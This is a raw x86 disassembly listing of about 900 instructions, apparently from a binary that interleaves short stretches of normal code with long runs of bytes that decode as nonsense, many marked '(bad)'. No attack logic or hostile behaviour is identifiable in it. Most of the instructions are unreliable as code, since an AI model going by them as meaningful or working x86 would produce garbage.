  4111ba:	mov    DWORD PTR [ebp-0x34],0x3663
  4111c1:	mov    DWORD PTR [ebp-0xb4],0x3165
  4111cb:	mov    DWORD PTR [ebp-0xc0],0x1ebe
  4111d5:	mov    DWORD PTR [ebp-0xbc],0x43cc
  4111df:	jmp    0x411454
  4111e4:	mov    ecx,0x1c975440
  4111e9:	jnp    0x41119d
  4111eb:	push   ds
  4111ec:	jl     0x41125d
  4111ee:	mov    esi,DWORD PTR [eax+0x7c]
  4111f1:	pop    esp
  4111f2:	popa   
  4111f3:	jo     0x4111e3
  4111f5:	jl     0x41120f
  4111f7:	sbb    BYTE PTR [ecx+0x14],dh
  4111fa:	sbb    BYTE PTR [eax],bl
  4111fc:	out    dx,eax
  4111fd:	dec    esi
  4111fe:	das    
  4111ff:	cs xchg ebx,eax
  411201:	dec    esi
  411202:	out    dx,al
  411203:	push   ecx
  411204:	fdivr  DWORD PTR [edi]
  411206:	inc    esi
  411207:	fsub   st,st(3)
  411209:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41120a:	push   ecx
  41120b:	jl     0x41127b
  41120d:	enter  0xa28e,0xd7
  411211:	mov    fs,ecx
  411213:	xor    eax,0x7c710ff0
  411218:	pop    edi
  411219:	mov    edi,0xdc40e04d
  41121e:	inc    ebp
  41121f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411220:	jmp    0xd33add6f
  411225:	enter  0x11c6,0x3
  411229:	or     ebp,0xffffffa3
  41122c:	stos   DWORD PTR es:[edi],eax
  41122d:	or     esi,ebx
  41122f:	(bad)  [edi+0x22]
  411232:	dec    esi
  411233:	scas   al,BYTE PTR es:[edi]
  411234:	push   ebp
  411235:	iret   
  411236:	imul   esi,DWORD PTR [esi],0x73522838
  41123c:	pop    esp
  41123d:	imul   ecx,DWORD PTR [eax],0x883b9fc7
  411243:	test   al,0x47
  411245:	add    edx,DWORD PTR [esi-0x66]
  411248:	hlt    
  411249:	lea    eax,[edx-0x595af3bd]
  41124f:	push   0x3db24acd
  411254:	dec    ebx
  411255:	ss shl dl,cl
  411258:	push   cs
  411259:	xchg   edi,eax
  41125a:	sti    
  41125b:	mov    eax,ds:0x5e956241
  411260:	mov    ah,0xea
  411262:	sbb    al,0x3
  411264:	ins    DWORD PTR es:[edi],dx
  411265:	adc    eax,0xf65d4bf1
  41126a:	mov    ebx,0x98379450
  41126f:	(bad)  
  411270:	stc    
  411271:	nop
  411272:	mov    ebp,0xcfdfe21a
  411277:	mov    esp,0xf4d26d00
  41127c:	repnz xor DWORD PTR [edx-0x35],ebx
  411280:	inc    ebx
  411281:	ss inc ecx
  411283:	pop    ds
  411284:	cdq    
  411285:	retf   
  411286:	outs   dx,BYTE PTR ds:[esi]
  411287:	fistp  WORD PTR [ecx+0x54b67a67]
  41128d:	xlat   BYTE PTR ds:[ebx]
  41128e:	retf   
  41128f:	nop
  411290:	sbb    al,0xf1
  411292:	out    0x9,eax
  411294:	jl     0x41121b
  411296:	mov    al,0x27
  411298:	sbb    al,0xee
  41129a:	mov    eax,0x47fefd04
  41129f:	jmp    eax
  4112a1:	mov    ecx,0x3e1a3720
  4112a6:	xchg   edx,eax
  4112a7:	sub    dh,bl
  4112a9:	sub    esp,eax
  4112ab:	test   DWORD PTR [eax-0x2e4bec1d],0xee64ef0a
  4112b5:	sub    ebx,DWORD PTR [eax]
  4112b7:	(bad)  
  4112b8:	ficom  WORD PTR [ebx]
  4112ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112bb:	(bad)  
  4112bc:	stc    
  4112bd:	(bad)  
  4112be:	call   0xd7e08c55
  4112c3:	pushf  
  4112c4:	dec    ebp
  4112c5:	adc    bl,BYTE PTR [edi+esi*8-0x383b643d]
  4112cc:	(bad)  
  4112cd:	xor    bl,BYTE PTR ds:0xf6fe444d
  4112d3:	je     0x4112e6
  4112d5:	repz mov ss,WORD PTR gs:[eax-0x64]
  4112da:	cwde   
  4112db:	add    ebx,DWORD PTR [eax]
  4112dd:	add    eax,0x87d88d16
  4112e2:	push   esp
  4112e3:	adc    DWORD PTR [edx+0x6984fe58],esi
  4112e9:	xor    BYTE PTR [ecx-0x71b95f6d],dl
  4112ef:	les    ebp,FWORD PTR [edi+0x3508edd7]
  4112f5:	mov    esi,0x3e125cce
  4112fa:	rcr    DWORD PTR [esi],1
  4112fc:	scas   eax,DWORD PTR es:[edi]
  4112fd:	jb     0x411356
  4112ff:	adc    eax,0xeea96108
  411304:	sbb    DWORD PTR [edx+0x3e],ecx
  411307:	xchg   DWORD PTR [edx-0x1e],ecx
  41130a:	push   ds
  41130b:	fwait
  41130c:	popa   
  41130d:	clc    
  41130e:	cdq    
  41130f:	xor    eax,0x1339e977
  411314:	add    ebx,eax
  411316:	sbb    ch,bl
  411318:	xchg   esp,eax
  411319:	js     0x4112ca
  41131b:	retf   0xb3b6
  41131e:	ret    
  41131f:	jno    0x411350
  411321:	jl     0x41131d
  411323:	lock cs xchg ebp,eax
  411326:	icebp  
  411327:	lahf   
  411328:	fcom   DWORD PTR [edi+0x6f]
  41132b:	and    ecx,DWORD PTR [ecx-0x72]
  41132e:	ficom  WORD PTR [eax]
  411330:	mov    ah,0x37
  411332:	sbb    al,0xd1
  411334:	pop    edx
  411335:	mov    ah,0x85
  411337:	lods   al,BYTE PTR ds:[esi]
  411338:	mov    DWORD PTR [esi+edi*2],0x2cd61892
  41133f:	leave  
  411340:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411341:	enter  0x6f0,0x9
  411345:	(bad)  
  411346:	retf   
  411347:	ins    DWORD PTR es:[edi],dx
  411348:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411349:	jns    0x41132f
  41134b:	mov    edi,0x45f3be2e
  411350:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411351:	je     0x41130a
  411353:	push   ss
  411354:	and    ah,BYTE PTR [edx]
  411356:	sbb    DWORD PTR [esi],ecx
  411358:	mov    esp,0xd7e2aa50
  41135d:	cmp    BYTE PTR [eax-0x46],ah
  411360:	lods   al,BYTE PTR ds:[esi]
  411361:	xor    edi,DWORD PTR [ebx-0x5f]
  411364:	inc    eax
  411365:	out    0xda,al
  411367:	ret    
  411368:	dec    eax
  411369:	mov    dh,0x63
  41136b:	mov    BYTE PTR [edi-0x12],al
  41136e:	xor    edi,eax
  411370:	xor    BYTE PTR [esp+esi*1],al
  411373:	pusha  
  411374:	icebp  
  411375:	arpl   WORD PTR [eax],dx
  411377:	test   DWORD PTR [ecx+0x65],ebp
  41137a:	rol    BYTE PTR [edx],0xc2
  41137d:	in     eax,0xd5
  41137f:	jne    0x41132e
  411381:	mov    bh,0x8e
  411383:	adc    edx,esi
  411385:	bound  edx,QWORD PTR [ecx]
  411387:	mov    WORD PTR [ebx-0x425c5a66],?
  41138d:	(bad)  
  41138f:	jbe    0x4113d8
  411391:	xchg   ebp,eax
  411392:	icebp  
  411393:	rol    BYTE PTR [esi-0x1bb443b],0xa
  41139a:	mov    ah,ah
  41139c:	and    BYTE PTR [ebp-0x108fe66c],bh
  4113a2:	outs   dx,DWORD PTR ds:[esi]
  4113a3:	inc    edx
  4113a4:	cs mov eax,0x5ea515d3
  4113aa:	sbb    cl,ch
  4113ac:	adc    al,BYTE PTR [eax+ecx*1+0x4b]
  4113b0:	(bad)  
  4113b1:	pop    ebx
  4113b2:	xchg   edx,eax
  4113b3:	push   esp
  4113b4:	mov    ecx,0x60bc45b
  4113b9:	inc    edi
  4113ba:	(bad)  
  4113bb:	retf   
  4113bc:	dec    ebp
  4113bd:	dec    edx
  4113be:	cmc    
  4113bf:	fisttp DWORD PTR [ebp-0x3]
  4113c2:	loope  0x4113b9
  4113c4:	in     al,dx
  4113c5:	sbb    esi,esi
  4113c7:	sub    edx,edx
  4113c9:	add    bl,BYTE PTR [esi]
  4113cb:	sbb    al,0x3
  4113cd:	mov    ds:0x635bc68a,al
  4113d2:	and    eax,0xc77a9a8d
  4113d7:	cmp    eax,0x4e5cdd08
  4113dc:	imul   edi,DWORD PTR [eax-0x59716307],0x29
  4113e3:	mov    edi,0x62124f0f
  4113e8:	int    0xbb
  4113ea:	push   es
  4113eb:	dec    sp
  4113ed:	rol    bh,cl
  4113ef:	sbb    cl,al
  4113f1:	mov    fs,WORD PTR [edx]
  4113f3:	scas   eax,DWORD PTR es:[edi]
  4113f4:	(bad)  
  4113f5:	stc    
  4113f6:	jo     0x41146e
  4113f8:	cmp    al,0xb2
  4113fa:	jle    0x411456
  4113fc:	int3   
  4113fd:	out    0xde,al
  4113ff:	icebp  
  411400:	icebp  
  411401:	(bad)  
  411403:	sti    
  411404:	xor    BYTE PTR [bx],0x3e
  411408:	arpl   sp,cx
  41140a:	xchg   esp,eax
  41140b:	push   cs
  41140c:	scas   eax,DWORD PTR es:[edi]
  41140d:	add    al,0xd6
  41140f:	mov    esi,0xe07c47df
  411414:	int    0xf8
  411416:	adc    al,0xc6
  411418:	xchg   esi,eax
  411419:	xor    esp,ebx
  41141b:	fwait
  41141c:	aas    
  41141d:	xor    al,0x66
  41141f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411420:	rcl    BYTE PTR [edx],1
  411422:	(bad)  
  411423:	mov    dh,0x46
  411425:	aad    0x2c
  411427:	dec    ebx
  411428:	les    edi,FWORD PTR [ebp-0x20]
  41142b:	scas   eax,DWORD PTR es:[edi]
  41142c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41142d:	test   ch,0x8d
  411430:	add    BYTE PTR [edi-0x4abd1f28],bl
  411436:	icebp  
  411437:	dec    eax
  411438:	jbe    0x41140b
  41143a:	inc    edi
  41143b:	lahf   
  41143c:	jno    0x411438
  41143e:	mov    DWORD PTR [edx+0x10d35c4b],0xc54a9a43
  411448:	xchg   DWORD PTR ds:0x565151b3,ecx
  41144e:	adc    DWORD PTR [edx+edx*1+0x6],ecx
  411452:	xchg   DWORD PTR [edi+eax*8],eax
  411455:	test   DWORD PTR [eax-0x1],edx
  411458:	(bad)  
  411459:	jmp    DWORD PTR [ebp+esi*2+0x0]
  41145d:	add    bh,al
  41145f:	test   DWORD PTR [edi+edi*8-0x1],edx
  411463:	dec    edi
  411465:	sbb    BYTE PTR [eax],al
  411467:	add    bh,al
  411469:	test   DWORD PTR [eax-0x1],esp
  41146c:	(bad)  
  41146d:	push   DWORD PTR ds:0xc7000031
  411473:	test   DWORD PTR [edi+edi*8-0x1],esp
  411477:	dec    DWORD PTR [ebp-0x38ffffaa]
  41147d:	test   DWORD PTR [eax-0x1],esi
  411480:	(bad)  
  411481:	push   edx
  411483:	adc    DWORD PTR [eax],eax
  411485:	add    bh,al
  411487:	test   DWORD PTR [edi+edi*8-0x1],esi
  41148b:	(bad)  
  41148c:	jmp    0xf045:0xc7000063
  411493:	data16 xor BYTE PTR [eax],al
  411496:	add    bh,al
  411498:	inc    ebp
  411499:	clc    
  41149a:	shr    BYTE PTR [esi+0x0],cl
  41149d:	add    BYTE PTR [eax+0x1d],ch
  4114a0:	jle    0x4114a2
  4114a2:	add    cl,ch
  4114a4:	jo     0x4114a8
  4114a6:	add    BYTE PTR [eax],al
  4114a8:	dec    edi
  4114a9:	sub    bl,BYTE PTR [edx+0x3b209ab0]
  4114af:	sub    dl,BYTE PTR [eax-0xf81de78]
  4114b5:	jmp    0x411530
  4114b7:	jl     0x411500
  4114b9:	js     0x4114d3
  4114bb:	sbb    BYTE PTR [ecx+0x14],dh
  4114be:	sbb    BYTE PTR [eax],bl
  4114c0:	push   ds
  4114c1:	xchg   esp,eax
  4114c2:	(bad)  
  4114c3:	ficomp WORD PTR [ebx-0x4145cf48]
  4114c9:	add    DWORD PTR [ecx],0xfffffff8
  4114cc:	xchg   esp,eax
  4114cd:	and    BYTE PTR [eax],0xd5
  4114d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114d1:	cdq    
  4114d2:	(bad)  
  4114d3:	icebp  
  4114d4:	fistp  QWORD PTR [esi+0x69]
  4114d7:	stos   BYTE PTR es:[edi],al
  4114d8:	add    eax,0x3b50a89b
  4114dd:	xor    esp,DWORD PTR [eax+0x2cb7dd3d]
  4114e3:	pop    ebx
  4114e4:	ins    BYTE PTR es:[edi],dx
  4114e5:	std    
  4114e6:	or     BYTE PTR [esp+esi*4],dh
  4114e9:	scas   eax,DWORD PTR es:[edi]
  4114ea:	sahf   
  4114eb:	push   ecx
  4114ec:	into   
  4114ed:	mov    ah,0xae
  4114ef:	push   ebx
  4114f0:	popf   
  4114f1:	mov    esi,0xab259287
  4114f6:	and    ebp,ebx
  4114f8:	and    ah,BYTE PTR [ebx]
  4114fa:	loop   0x411564
  4114fc:	mov    dl,0xf7
  4114fe:	and    eax,0x735e8e6f
  411503:	xor    ecx,DWORD PTR [edi]
  411505:	sar    ch,cl
  411507:	loop   0x411580
  411509:	xchg   ebx,eax
  41150a:	retf   
  41150b:	into   
  41150c:	in     eax,0x71
  41150e:	scas   al,BYTE PTR es:[edi]
  41150f:	test   DWORD PTR [ebp-0x10],esi
  411512:	(bad)  
  411513:	(bad)  
  411514:	std    
  411515:	xor    BYTE PTR [eax-0x22bacbd2],0xe8
  41151c:	iret   
  41151d:	movhlps xmm5,xmm3
  411520:	adc    esi,edi
  411522:	fcomp  QWORD PTR [ecx-0x71197078]
  411528:	dec    edi
  411529:	ret    
  41152a:	pop    ds
  41152b:	jno    0x411569
  41152d:	jne    0x411563
  41152f:	xor    ch,BYTE PTR [esp+eax*8-0x5a]
  411533:	sbb    al,0x96
  411535:	xor    edx,DWORD PTR ds:0x2844b62a
  41153b:	sub    dh,BYTE PTR [ebp-0x5693bd16]
  411541:	or     al,0x8f
  411543:	js     0x411548
  411545:	pop    esi
  411546:	push   DWORD PTR [ebx]
  411548:	pop    esi
  411549:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41154a:	mov    dh,0x8d
  41154c:	daa    
  41154d:	out    0x48,al
  41154f:	or     eax,0x65f2f04d
  411554:	aaa    
  411555:	(bad)  
  411556:	out    dx,eax
  411557:	scas   al,BYTE PTR es:[edi]
  411558:	sub    BYTE PTR [esi+0x5f],bh
  41155b:	das    
  41155c:	retf   
  41155d:	fistp  QWORD PTR [esi+0x5309f967]
  411563:	fdivr  QWORD PTR [ebx]
  411565:	push   eax
  411566:	jle    0x411596
  411568:	jo     0x4115e3
  41156a:	or     al,0xe6
  41156c:	xchg   bl,ch
  41156e:	sub    DWORD PTR [ecx+0x4a11751d],ebx
  411574:	mov    dh,0xd
  411576:	pushf  
  411577:	pop    ecx
  411578:	adc    DWORD PTR [esi+0x282af57],0xfea9136
  411582:	lods   al,BYTE PTR ds:[esi]
  411583:	call   0x114:0x82fbd7a6
  41158a:	in     al,dx
  41158b:	cmp    al,0x30
  41158d:	in     eax,dx
  41158e:	imul   eax,eax,0xf2c04eb3
  411594:	int    0x6c
  411596:	(bad)  
  411597:	and    al,0x33
  411599:	xchg   bl,dl
  41159b:	or     eax,0xf58d56a
  4115a0:	stos   BYTE PTR es:[edi],al
  4115a1:	pop    ss
  4115a2:	sub    eax,0x2c01c327
  4115a7:	ror    BYTE PTR [esi],cl
  4115a9:	test   BYTE PTR [edi+0x10],dl
  4115ac:	sub    eax,0xba1ec0b6
  4115b1:	sub    BYTE PTR [ebx+ebx*8+0x1a],ch
  4115b5:	cmc    
  4115b6:	dec    esi
  4115b7:	dec    ecx
  4115b8:	pop    ds
  4115b9:	arpl   cx,bp
  4115bb:	mov    esp,0xcadbef88
  4115c0:	fld    QWORD PTR [esi+esi*1+0x40]
  4115c4:	jnp    0x411574
  4115c6:	mov    eax,0xf558789d
  4115cb:	shr    BYTE PTR [ebx],0x7
  4115ce:	sub    dl,BYTE PTR [ebp+0x49cd5cab]
  4115d4:	fisttp QWORD PTR [eax-0x608dba0e]
  4115da:	inc    ebx
  4115db:	mov    dl,0xa4
  4115dd:	das    
  4115de:	iret   
  4115df:	sbb    DWORD PTR [eax],esi
  4115e1:	xchg   ecx,eax
  4115e2:	(bad)  
  4115e3:	fadd   st(0),st
  4115e5:	repz scas eax,DWORD PTR es:[edi]
  4115e7:	dec    eax
  4115e8:	jecxz  0x41164d
  4115ea:	(bad)  
  4115eb:	bnd jne 0x411654
  4115ee:	fbstp  TBYTE PTR [edi-0x7b]
  4115f1:	adc    eax,0xbfb9dd0c
  4115f6:	push   0x48
  4115f8:	xchg   edx,eax
  4115f9:	loop   0x41157e
  4115fb:	call   edi
  4115fd:	cmp    al,0x29
  4115ff:	in     al,0xfb
  411601:	div    bh
  411603:	test   al,0x63
  411606:	in     al,0xbf
  411608:	test   eax,0x46455db9
  41160d:	xor    DWORD PTR [ebx+edi*1],ecx
  411610:	adc    esi,edx
  411612:	pop    ebp
  411613:	popa   
  411614:	je     0x4115e1
  411616:	inc    ebx
  411617:	pop    ebx
  411618:	and    DWORD PTR [esi+esi*8-0x57ba68c7],ebp
  41161f:	popa   
  411620:	mov    ds:0x2f775af9,al
  411625:	jg     0x4115c4
  411627:	sub    edx,edi
  411629:	mov    dl,0x55
  41162b:	arpl   WORD PTR [edx+0x4b51ec6c],bp
  411631:	add    al,0x79
  411633:	into   
  411634:	in     al,dx
  411635:	cmp    BYTE PTR [edx-0x2c],bh
  411638:	mov    BYTE PTR [esi+0x3059ee7],dh
  41163e:	inc    eax
  41163f:	or     eax,0xc7243e3
  411644:	xor    DWORD PTR [esi+esi*4-0x2d72820e],ecx
  41164b:	call   0xd74a:0x240dbd75
  411652:	sub    eax,DWORD PTR [ebp+0x642a8ea3]
  411658:	pop    edx
  411659:	push   cs
  41165a:	shl    BYTE PTR [ebp-0x6bbe5e97],0x5c
  411661:	dec    ebp
  411662:	pop    ebp
  411663:	jae    0x411656
  411665:	call   FWORD PTR es:[edi+ecx*1+0x2e]
  41166a:	les    edx,FWORD PTR [ebx+0x45]
  41166d:	(bad)  
  41166e:	loopne 0x4115ff
  411670:	outs   dx,BYTE PTR ds:[esi]
  411671:	xlat   BYTE PTR ds:[ebx]
  411672:	mov    ecx,0xaf4021c5
  411677:	or     ebx,DWORD PTR ss:[edx-0x1b]
  41167b:	setp   BYTE PTR [ebx]
  41167e:	ja     0x4116bc
  411680:	mov    bl,0xa9
  411682:	pushf  
  411683:	loopne 0x4116d5
  411685:	retf   
  411686:	xor    eax,0x4488c3e2
  41168b:	mov    dl,0x8
  41168d:	scas   al,BYTE PTR es:[edi]
  41168e:	loope  0x41166d
  411690:	mov    edx,?
  411692:	scas   al,BYTE PTR es:[edi]
  411693:	call   0x87859ea3
  411698:	add    DWORD PTR [ebx],esi
  41169a:	inc    ebx
  41169b:	jae    0x41168d
  41169d:	(bad)  
  41169e:	in     al,0x54
  4116a0:	push   ss
  4116a1:	push   0x74
  4116a3:	pop    edx
  4116a4:	repz dec edi
  4116a6:	xchg   esp,eax
  4116a7:	inc    ebp
  4116a8:	add    al,0x3
  4116aa:	sbb    ebp,DWORD PTR [ecx-0x13]
  4116ad:	retf   0xc2e2
  4116b0:	sub    WORD PTR [eax+0x2f5d8e1e],ax
  4116b7:	fucomp st(3)
  4116b9:	div    BYTE PTR [ecx+ecx*1+0x2457e8bb]
  4116c0:	into   
  4116c1:	fsub   QWORD PTR [ecx]
  4116c3:	rcr    BYTE PTR [edx],0xac
  4116c6:	ins    DWORD PTR es:[edi],dx
  4116c7:	or     bh,bh
  4116c9:	arpl   ax,bp
  4116cb:	jne    0x4116c6
  4116cd:	test   BYTE PTR [edi],ch
  4116cf:	sub    DWORD PTR [edi+0x404b2167],eax
  4116d5:	mov    dh,0xd6
  4116d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116d8:	inc    edx
  4116d9:	jbe    0x411758
  4116db:	outs   dx,BYTE PTR ds:[esi]
  4116dc:	in     al,dx
  4116dd:	xor    eax,0xe437443d
  4116e2:	add    eax,0xe4e9b159
  4116e7:	retf   
  4116e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116e9:	mov    al,0x54
  4116eb:	addr16 loop 0x411736
  4116ee:	(bad)  
  4116ef:	xchg   edx,eax
  4116f0:	stos   BYTE PTR es:[edi],al
  4116f1:	call   0xc31a:0x8248f096
  4116f8:	cmp    esp,DWORD PTR es:[esi+ebp*8+0x7bf25ac1]
  411700:	popa   
  411701:	cld    
  411702:	sbb    esp,esi
  411704:	sbb    BYTE PTR [eax],al
  411706:	add    al,0x45
  411708:	add    DWORD PTR [eax-0x3cbbcea],0x1ec7bde6
  411712:	js     0x411708
  411714:	outs   dx,DWORD PTR ds:[esi]
  411715:	pop    ebp
  411716:	inc    BYTE PTR [esi]
  411718:	mov    DWORD PTR [ebp-0x4],0x30f4
  41171f:	mov    eax,DWORD PTR [ebp-0x20]
  411722:	mov    ecx,DWORD PTR [ebp-0x1c]
  411725:	push   0x5380
  41172a:	push   ecx
  41172b:	push   eax
  41172c:	call   0x416c20
  411731:	mov    ecx,eax
  411733:	mov    eax,DWORD PTR [ebp-0x30]
  411736:	xor    ecx,eax
  411738:	mov    esi,edx
  41173a:	mov    edx,DWORD PTR [ebp-0x2c]
  41173d:	mov    eax,DWORD PTR [ebp-0x40]
  411740:	xor    esi,edx
  411742:	jmp    0x4119b7
  411747:	lds    edi,FWORD PTR [ecx]
  411749:	fisubr WORD PTR [ebp+0x5a]
  41174c:	sbb    al,BYTE PTR [edx+0x21]
  41174f:	pusha  
  411750:	mov    al,ds:0xa94aa57
  411755:	cmp    edi,DWORD PTR [esi+0x1818749e]
  41175b:	jno    0x411771
  41175d:	sbb    BYTE PTR [eax],bl
  41175f:	rcl    BYTE PTR [edi],1
  411761:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411762:	not    BYTE PTR [esi]
  411764:	retf   0xb07
  411767:	pop    ebp
  411768:	and    dh,BYTE PTR [edi+0x4a383105]
  41176e:	or     al,BYTE PTR ds:0x70d4bfec
  411774:	(bad)  
  411776:	add    edx,DWORD PTR [ecx+0x5b]
  411779:	outs   dx,BYTE PTR ds:[esi]
  41177a:	retf   
  41177b:	xor    eax,0x51800092
  411780:	xor    al,al
  411782:	mov    ah,al
  411784:	inc    esi
  411785:	loopne 0x41172b
  411787:	(bad)  
  411788:	outs   dx,BYTE PTR ds:[esi]
  411789:	push   ss
  41178a:	test   DWORD PTR [edi+edi*4-0x55],edx
  41178e:	ds inc edi
  411790:	mov    ecx,ebp
  411792:	push   es
  411793:	mov    eax,0xae26c1fb
  411798:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411799:	jne    0x411726
  41179b:	ins    DWORD PTR es:[edi],dx
  41179c:	mov    WORD PTR [ebp-0x20037abf],?
  4117a2:	mov    al,0xf8
  4117a4:	(bad)  [ebp+0x6b]
  4117a7:	ins    BYTE PTR es:[edi],dx
  4117a8:	cdq    
  4117a9:	pop    ecx
  4117aa:	cwde   
  4117ab:	cld    
  4117ac:	dec    eax
  4117ad:	mov    dl,0x5c
  4117af:	imul   edx,DWORD PTR [edi-0x6bc5cb1c],0xf1cdc648
  4117b9:	test   ecx,edx
  4117bb:	xor    dl,al
  4117bd:	push   es
  4117be:	cdq    
  4117bf:	retf   
  4117c0:	mov    edx,0x917dfa40
  4117c5:	or     eax,0xd56b52f
  4117ca:	sbb    BYTE PTR [edx-0x583cd733],bl
  4117d0:	cs fs aaa 
  4117d3:	dec    edx
  4117d4:	jbe    0x4117a9
  4117d6:	dec    ebx
  4117d7:	test   al,0xba
  4117d9:	test   al,0x47
  4117db:	push   esi
  4117dc:	mov    ds:0x7f3b3337,al
  4117e1:	fld    TBYTE PTR [edi]
  4117e3:	pop    ecx
  4117e4:	sub    BYTE PTR ds:0xfc9116b2,al
  4117ea:	sub    edx,DWORD PTR [ecx]
  4117ec:	push   esi
  4117ed:	shl    BYTE PTR [ecx-0x22afd350],cl
  4117f3:	sub    eax,0x55108e09
  4117f8:	pop    es
  4117f9:	jmp    0x8f70:0x4d453942
  411800:	std    
  411801:	sub    al,0x5d
  411803:	jno    0x411844
  411805:	and    eax,0x9fa92d56
  41180a:	mov    al,ds:0xec689e16
  41180f:	mov    al,0xb0
  411811:	or     BYTE PTR [ebx+0x54],ah
  411814:	inc    ebx
  411815:	lods   eax,DWORD PTR ds:[esi]
  411816:	mov    esp,0x7b5b7ecf
  41181b:	sahf   
  41181c:	in     eax,0xda
  41181e:	push   ds
  41181f:	imul   edi,DWORD PTR [ecx+0x7],0xb487f33b
  411826:	and    al,0xaa
  411828:	lock stos DWORD PTR es:[edi],eax
  41182a:	sbb    DWORD PTR [ebx-0x67],ecx
  41182d:	jmp    0x3f03faef
  411832:	shl    ch,0xd9
  411835:	sbb    DWORD PTR [ecx+eiz*2-0x60],ecx
  411839:	in     al,dx
  41183a:	push   ss
  41183b:	repz and DWORD PTR ss:[edx+0x63900ed],esp
  411843:	mov    esp,0x5d26739d
  411848:	inc    ecx
  411849:	dec    bl
  41184b:	addr16 jp 0x4117f1
  41184e:	test   eax,0x4498450f
  411853:	push   ds
  411854:	inc    ebp
  411855:	ins    DWORD PTR es:[edi],dx
  411856:	and    bl,BYTE PTR cs:[ebx-0x3d]
  41185a:	adc    BYTE PTR [ebx-0x37b94d75],dl
  411860:	sub    al,0xa8
  411862:	inc    ecx
  411863:	cld    
  411864:	sub    DWORD PTR [edx-0xd3ba18b],0x6b
  41186b:	aad    0xec
  41186d:	loope  0x41183f
  41186f:	or     ch,BYTE PTR [edx]
  411871:	and    al,0x5b
  411873:	push   ss
  411874:	lea    edx,[ecx-0x3a]
  411877:	add    dh,BYTE PTR [eax-0x2abce9a4]
  41187d:	cld    
  41187e:	imul   eax,DWORD PTR [ebx+ebp*4-0x2d],0xffffff90
  411883:	jb     0x411822
  411885:	retf   0xb75d
  411888:	stos   DWORD PTR es:[edi],eax
  411889:	retf   0x7a2b
  41188c:	push   cs
  41188d:	sbb    al,0x67
  41188f:	adc    edi,DWORD PTR [edx+0x36]
  411892:	adc    DWORD PTR [ebp-0x10378caf],edi
  411898:	adc    DWORD PTR [edx],0xffffffa0
  41189b:	loope  0x411872
  41189d:	push   ebp
  41189e:	jmp    0x41187f
  4118a0:	hlt    
  4118a1:	pushf  
  4118a2:	adc    WORD PTR [ebx-0x7e],0xff82
  4118a7:	aam    0x64
  4118a9:	in     al,0x7e
  4118ab:	stc    
  4118ac:	scas   eax,DWORD PTR es:[edi]
  4118ad:	es add eax,0x1858a6d0
  4118b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118b4:	lods   eax,DWORD PTR ds:[esi]
  4118b5:	mov    eax,0x33f78b01
  4118ba:	xor    BYTE PTR [edx-0x64a2e2b9],0xb3
  4118c1:	sub    BYTE PTR [ebx+0x5c939fa],dl
  4118c7:	pop    eax
  4118c8:	mov    al,ds:0x569ba327
  4118cd:	lods   al,BYTE PTR ds:[esi]
  4118ce:	(bad)  
  4118cf:	push   edi
  4118d0:	leave  
  4118d1:	push   ds
  4118d2:	mov    dh,0x5f
  4118d4:	fsubr  QWORD PTR [ebx-0x7631b1f7]
  4118da:	rcr    bh,0x52
  4118dd:	push   0x4ec8a331
  4118e2:	mov    ah,0x2d
  4118e4:	sbb    edx,DWORD PTR [ecx-0x4d]
  4118e7:	sahf   
  4118e8:	out    dx,eax
  4118e9:	xor    esp,DWORD PTR [esi+0x776aed6c]
  4118ef:	dec    esi
  4118f0:	push   ss
  4118f1:	fldenv [edx-0x53fac123]
  4118f7:	pminub mm3,QWORD PTR [edx]
  4118fa:	sbb    BYTE PTR [esi],ah
  4118fc:	repz mov al,0x15
  4118ff:	push   edx
  411900:	pop    edx
  411901:	aas    
  411902:	je     0x41190c
  411904:	dec    esi
  411905:	push   esp
  411906:	or     DWORD PTR [ebx+0x4c1e05f7],ebx
  41190c:	retf   
  41190d:	das    
  41190e:	dec    ebx
  41190f:	mov    bl,BYTE PTR [ebx-0x2a]
  411912:	fst    QWORD PTR [eax-0x46]
  411915:	test   al,0x25
  411917:	pop    ebx
  411918:	mov    al,0x95
  41191a:	jo     0x411909
  41191c:	push   esi
  41191d:	ins    DWORD PTR es:[edi],dx
  41191e:	or     DWORD PTR [edi-0x1304ae1e],0xfffffff3
  411925:	rcr    BYTE PTR [ebp+0x61],0x67
  411929:	iret   
  41192a:	aad    0xeb
  41192c:	inc    esp
  41192d:	cdq    
  41192e:	dec    bp
  411930:	cs jg  0x411939
  411933:	and    al,0x38
  411935:	loopne 0x4118be
  411937:	jo     0x41199c
  411939:	adc    ecx,esp
  41193b:	cmp    edi,DWORD PTR [edx+esi*1]
  41193e:	lods   eax,DWORD PTR ds:[esi]
  41193f:	mov    bh,0x40
  411941:	loopne 0x4118e1
  411943:	lock jbe 0x4119bc
  411946:	xchg   esp,eax
  411947:	sub    dh,BYTE PTR [ebx+0x43976b61]
  41194d:	cmp    BYTE PTR [esi],bh
  41194f:	jmp    0x262431c1
  411954:	mov    edx,0x2fde141d
  411959:	inc    ebp
  41195a:	int    0x62
  41195c:	mov    dh,0x2d
  41195e:	das    
  41195f:	rol    DWORD PTR [ebx],1
  411961:	int3   
  411962:	add    eax,0x8d03e969
  411967:	jecxz  0x41194d
  411969:	jmp    0x5aa90e30
  41196e:	lahf   
  41196f:	aad    0x8e
  411971:	out    dx,eax
  411972:	sbb    BYTE PTR [esi-0x65d19e32],al
  411978:	sbb    al,0x3
  41197a:	lds    edx,FWORD PTR [esi]
  41197c:	stos   DWORD PTR es:[edi],eax
  41197d:	mov    bh,0x11
  41197f:	(bad)  
  411981:	jmp    0x411974
  411983:	cmp    BYTE PTR [esi-0x3f],cl
  411986:	adc    ebp,ebp
  411988:	(bad)  
  411989:	xlat   BYTE PTR ds:[ebx]
